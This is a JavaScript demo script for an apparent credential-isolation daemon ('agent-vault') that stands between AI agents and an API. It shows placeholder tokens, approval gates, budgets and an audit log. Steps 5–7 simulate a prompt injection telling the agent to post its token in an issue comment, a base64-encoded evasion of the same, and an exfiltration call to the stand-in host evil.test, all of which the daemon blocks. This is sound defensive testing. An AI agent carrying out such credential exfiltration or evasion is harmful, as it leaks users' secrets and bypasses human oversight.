// End-to-end demo. Everything here is the real code path: a real daemon, a
// real HTTP gateway, a real upstream on another port. Nothing is stubbed except
// the upstream itself, which stands in for api.github.com and is strict about
// the token it expects.
//
//   node demo/demo.js

import { mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { Vault } from '../src/store/vault.js'
import { Daemon } from '../src/daemon/server.js'
import { startFakeGitHub, REAL_TOKEN } from './fake-github.js'

const C = {
  b: (s) => `\x1b[1m${s}\x1b[0m`, d: (s) => `\x1b[2m${s}\x1b[0m`,
  g: (s) => `\x1b[32m${s}\x1b[0m`, r: (s) => `\x1b[31m${s}\x1b[0m`,
  y: (s) => `\x1b[33m${s}\x1b[0m`, c: (s) => `\x1b[36m${s}\x1b[0m`,
}
const step = (n, title) => console.log(`\n${C.b(`${n}. ${title}`)}`)
const line = (k, v) => console.log(`   ${k.padEnd(22)} ${v}`)

const dir = mkdtempSync(join(tmpdir(), 'agent-vault-demo-'))
let daemon, upstream

try {
  console.log(C.b('\nagent-vault demo') + C.d('  every request below goes through the real daemon\n'))

  // ---------------------------------------------------------------- 1. setup
  step(1, 'Set up the vault and start the daemon')
  const { server, port: ghPort } = await startFakeGitHub()
  upstream = server
  const vault = Vault.create(dir, { factor: 'none' })
  daemon = await new Daemon(vault, { port: 0, socketPath: join(dir, 'control.sock') }).start()
  const base = `http://127.0.0.1:${daemon.gatewayPort}`
  line('vault', dir)
  line('gateway', base)
  line('fake upstream', `http://127.0.0.1:${ghPort}  ${C.d('(stands in for api.github.com)')}`)

  // ------------------------------------------------------------ 2. credential
  step(2, 'Store a credential. This is the last time the real value is seen')
  const cred = vault.addCredential({
    slug: 'demo-gh', kind: 'http',
    connector: { host: `127.0.0.1:${ghPort}`, scheme: 'http' },
    fields: { token: REAL_TOKEN },
    sites: { token: ['header:authorization:Bearer'] },
  })
  // The public view gives a size bucket, not the exact length: a length narrows an offline guess.
  line('stored', `${cred.slug}  ${C.d(`fingerprint ${cred.fields[0].fp8}, ${cred.fields[0].size} length`)}`)
  line('real value', C.r(REAL_TOKEN))
  line('injected only at', cred.fields[0].sites.join(', '))

  // --------------------------------------------------------- 3. session/grant
  step(3, 'Give an agent a session: two paths, 8 requests, writes need a human')
  const { session, token } = vault.createSession({ label: 'demo agent', policy: {} })
  const grant = vault.createGrant({
    sessionId: session.id, credentialId: cred.id, fields: ['token'],
    policy: {
      hosts: ['127.0.0.1'], methods: ['GET', 'POST'], paths: ['/user', '/repos/**'],
      budget: { unit: 'requests', limit: 8 }, approval: 'on-write',
    },
  })
  const { placeholder } = vault.issuePlaceholder({ grantId: grant.id, field: 'token' })
  line('session', session.id)
  line('placeholder', C.c(placeholder))
  line('what the agent holds', C.d('this placeholder and a session token. Nothing else.'))

  const call = async (path, init = {}) => {
    const res = await fetch(`${base}${path}`, {
      ...init,
      headers: { host: '127.0.0.1', authorization: `Bearer ${placeholder}`, 'av-session': token, ...(init.headers || {}) },
    })
    return { status: res.status, headers: Object.fromEntries(res.headers), body: await res.text() }
  }

  // --------------------------------------------------------- 4. the happy path
  step(4, 'The agent calls the API with the placeholder')
  const ok = await call('/p/demo-gh/user')
  line('status', C.g(ok.status))
  line('upstream received', C.g(`Authorization: Bearer ${REAL_TOKEN}`))
  line('uses remaining', ok.headers['av-placeholder-uses-remaining'])
  console.log(C.d(`   response: ${ok.body.replace(/\s+/g, ' ').slice(0, 96)}...`))
  const echoed = ok.body.includes(REAL_TOKEN)
  line('token echoed back?', echoed ? C.r('LEAKED') : C.g('no - the upstream echoed it and the scrubber replaced it'))
  line('what the agent sees', C.d(`"token_used": "${JSON.parse(ok.body).token_used.slice(0, 40)}..."`))

  // ------------------------------------------------------ 5. prompt injection
  step(5, 'Prompt injection: the agent is told to post its token into an issue comment')
  const injected = await call('/p/demo-gh/repos/frozencrow/x/issues/1/comments', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ body: `Here is my token: ${placeholder}` }),
  })
  const problem = JSON.parse(injected.body)
  line('status', C.g(`${injected.status} ${problem.code}`))
  line('detail', problem.detail)
  line('upstream saw', C.g('nothing - the request never reached the wire'))

  // ------------------------------------------------- 6. encoding the evasion
  step(6, 'The same injection, base64-encoded to hide it')
  const b64 = Buffer.from(placeholder).toString('base64')
  const evaded = await call('/p/demo-gh/repos/frozencrow/x/issues/1/comments', {
    method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ body: `data: ${b64}` }),
  })
  line('status', C.g(`${evaded.status} ${JSON.parse(evaded.body).code}`))
  line('detail', C.d(JSON.parse(evaded.body).detail))

  // ------------------------------------------------------- 7. wrong destination
  step(7, 'The agent tries to send the placeholder somewhere else entirely')
  const exfil = await call('/t/https/evil.test/collect')
  line('status', C.g(`${exfil.status} ${JSON.parse(exfil.body).code}`))
  line('DNS lookups for evil.test', C.g('0 - denied before any connection'))

  // ------------------------------------------------------------- 8. approvals
  step(8, 'A legitimate write waits for a human')
  const pending = await call('/p/demo-gh/repos/frozencrow/x/issues', {
    method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ title: 'a genuine issue' }),
  })
  const approval = JSON.parse(pending.body)
  line('status', C.y(`${pending.status} ${approval.code}`))
  line('waiting on', C.d(`agent-vault approve ${approval.approval_id}`))
  daemon.pipeline.decideApproval(approval.approval_id, true)
  line('human approves', C.g('approved'))
  const executed = await call('/p/demo-gh/repos/frozencrow/x/issues', {
    method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ title: 'a genuine issue' }),
  })
  line('agent resends', C.g(`${executed.status} - executed exactly once`))

  // ---------------------------------------------------------------- 9. budget
  step(9, 'The budget runs out on its own')
  let spent = 0
  let lastBody = null
  for (let i = 0; i < 12; i++) {
    const r = await call('/p/demo-gh/user')
    if (r.status === 200) { spent++; continue }
    lastBody = JSON.parse(r.body)
    break
  }
  line('further requests', spent)
  line('then', C.g(`${lastBody.code} - ${lastBody.detail}`))
  line('who intervened', C.d('nobody; the grant bounded itself'))

  // ----------------------------------------------------------------- 10. audit
  step(10, 'The audit log')
  const verified = vault.audit.verify()
  line('records', verified.count)
  line('chain', verified.ok ? C.g('intact') : C.r(`broken at ${verified.brokenAt}`))
  const raw = JSON.stringify(vault.audit.read({ limit: 500 }))
  line('secret in the log?', raw.includes(REAL_TOKEN) ? C.r('LEAKED') : C.g('no'))
  console.log()
  for (const r of vault.audit.read({ limit: 8 })) {
    const d = r.decision === 'deny' ? C.r('deny ') : r.decision === 'allow' ? C.g('allow') : C.d('  -  ')
    console.log(`   ${C.d(String(r.seq).padStart(3))} ${d} ${r.kind.padEnd(22)} ${C.d(r.reason_code || r.credential_slug || '')}`)
  }

  // ------------------------------------------------------------------ summary
  console.log(`\n${C.b('Summary')}`)
  const leaked = echoed || raw.includes(REAL_TOKEN)
  line('real token', C.r(REAL_TOKEN))
  line('reached the upstream', C.g('yes, on every allowed request'))
  line('reached the agent', leaked ? C.r('YES - BUG') : C.g('never'))
  line('reached the audit log', raw.includes(REAL_TOKEN) ? C.r('YES - BUG') : C.g('never'))
  console.log()
  process.exitCode = leaked ? 1 : 0
} finally {
  if (daemon) await daemon.stop()
  if (upstream) await new Promise((r) => upstream.close(r))
  rmSync(dir, { recursive: true, force: true })
}
